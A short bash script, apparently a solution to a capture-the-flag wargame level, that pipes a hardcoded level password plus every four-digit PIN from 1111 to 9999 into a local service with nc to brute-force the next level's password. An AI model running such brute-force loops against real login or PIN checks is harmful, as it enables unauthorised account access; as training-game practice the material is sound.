#!/bin/bash
#it'll brute-force 1111 to 9999 all numbers and find once. 
#when find it's going to say bandit25 password

#             for loop and grep

bandit24password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for i in {1111..9999}; do
    echo "$bandit24password $i"
done | nc localhost 30002
